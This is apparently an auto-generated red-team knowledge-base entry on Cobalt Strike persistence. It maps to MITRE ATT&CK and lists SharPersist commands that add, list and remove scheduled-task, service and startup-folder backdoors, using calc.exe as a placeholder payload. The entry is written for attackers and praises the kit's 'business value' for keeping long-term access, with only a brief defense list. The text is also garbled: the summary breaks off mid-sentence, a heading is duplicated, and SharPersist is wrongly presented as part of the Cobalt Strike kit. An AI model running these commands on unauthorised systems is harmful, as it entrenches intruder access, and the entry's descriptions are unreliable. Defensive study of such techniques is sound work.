---
id: 8fa0b1ce-ef5d-4275-bacb-a73b7d9d0005
name: Cobalt Strike Persistence Kit
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:16.662622+00:00'
updated_at: '2023-04-10T20:36:23.612172+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Registry Run Keys / Startup Folder|T1060 - Registry Run Keys / Startup Folder]]'
- '[[Scheduled Task|T1053 - Scheduled Task]]'
tags:
- '[[Cobalt Strike]]'
- '[[Kits]]'
- '[[Persistence Kit]]'
commands:
- '[[Add a new hourly schtask persistence using SharPersist]]'
- '[[Add a new persistence using SharPersist]]'
- '[[Add a new schtask persistence using SharPersist]]'
- '[[Add a new service persistence using SharPersist]]'
- '[[List persistences using SharPersist]]'
- '[[Remove a persistence using SharPersist]]'
- '[[Remove a schtask persistence using SharPersist]]'
- '[[Remove a service persistence using SharPersist]]'
---

# Cobalt Strike Persistence Kit

## Summary

The Cobalt Strike Persistence Kit is a set of commands designed to establish persistence on a compromised system. This kit is typically used by attackers who have already gained access to a system and want to maintain access even after a reboot. The Persistence Kit includes the SharPersist command,

## Description

# Description

The Cobalt Strike Persistence Kit is a set of commands designed to establish persistence on a compromised system. This kit is typically used by attackers who have already gained access to a system and want to maintain access even after a reboot. The Persistence Kit includes the SharPersist command, which can be used to create a scheduled task that executes a payload at a specified time. This payload can be used to establish a reverse shell or execute other malicious code.

From a technical perspective, the Persistence Kit leverages various persistence mechanisms to ensure that the payload is executed each time the system is started. This includes adding entries to the Registry Run keys, creating a scheduled task, and adding entries to the Startup folder. The Cobalt Strike team provides detailed documentation on how to use these commands, making it easy for attackers to establish persistence on a system.

The business value of the Cobalt Strike Persistence Kit is that it allows attackers to maintain access to a compromised system, even after a reboot. This can be useful in situations where the attacker wants to maintain a long-term presence on the network, or where the attacker wants to ensure that the payload is executed even if the system is restarted for maintenance or other reasons.

## Requirements

1. Access to a compromised system

1. Cobalt Strike installed on the attacker's system

## Defense

1. Monitor for changes to the Registry Run keys, scheduled tasks, and Startup folder

1. Implement application whitelisting to prevent unauthorized code execution

1. Use strong passwords and two-factor authentication to prevent unauthorized access to systems

## Objectives

1. Establish persistence on a compromised system

1. Maintain access to a system even after a reboot

# Instructions

1. This command is used to list or add persistences on a system. The -t flag specifies the type of persistence to use, such as schtaskbackdoor, startupfolder, service, or schtask. The -m flag specifies the mode of the command, such as list or add. The -c flag specifies the command to execute, and the -a flag specifies the arguments to pass to the command. The -n flag specifies the name of the persistence. The -o flag specifies the frequency of the task, such as hourly or daily.

**Code**: [[# List persistences
SharPersist -t schtaskbackdoor]]

> The SharPersist command can be used to list or add persistences on a system. The -t flag specifies the type of persistence to use, such as schtaskbackdoor, startupfolder, service, or schtask. The -m flag specifies the mode of the command, such as list or add. The -c flag specifies the command to execute, and the -a flag specifies the arguments to pass to the command. The -n flag specifies the name of the persistence. The -o flag specifies the frequency of the task, such as hourly or daily. The command can be used to add a persistence, remove a persistence, or list existing persistences.

**Command** ([[List persistences using SharPersist]]):

```bash
SharPersist -t schtaskbackdoor -m list
SharPersist -t startupfolder -m list
SharPersist -t schtask -m list
```

**Command** ([[Add a new persistence using SharPersist]]):

```bash
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
```

**Command** ([[Remove a persistence using SharPersist]]):

```bash
SharPersist -t schtaskbackdoor -n "Something Cool" -m remove
```

**Command** ([[Add a new service persistence using SharPersist]]):

```bash
SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
```

**Command** ([[Remove a service persistence using SharPersist]]):

```bash
SharPersist -t service -n "Some Service" -m remove
```

**Command** ([[Add a new schtask persistence using SharPersist]]):

```bash
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
```

**Command** ([[Add a new hourly schtask persistence using SharPersist]]):

```bash
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
```

**Command** ([[Remove a schtask persistence using SharPersist]]):

```bash
SharPersist -t schtask -n "Some Task" -m remove
```

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Registry Run Keys / Startup Folder|T1060 - Registry Run Keys / Startup Folder]]
- [[Scheduled Task|T1053 - Scheduled Task]]

## Commands Used

- [[Add a new hourly schtask persistence using SharPersist]]
- [[Add a new persistence using SharPersist]]
- [[Add a new schtask persistence using SharPersist]]
- [[Add a new service persistence using SharPersist]]
- [[List persistences using SharPersist]]
- [[Remove a persistence using SharPersist]]
- [[Remove a schtask persistence using SharPersist]]
- [[Remove a service persistence using SharPersist]]

## Tags

- [[Cobalt Strike]]
- [[Kits]]
- [[Persistence Kit]]
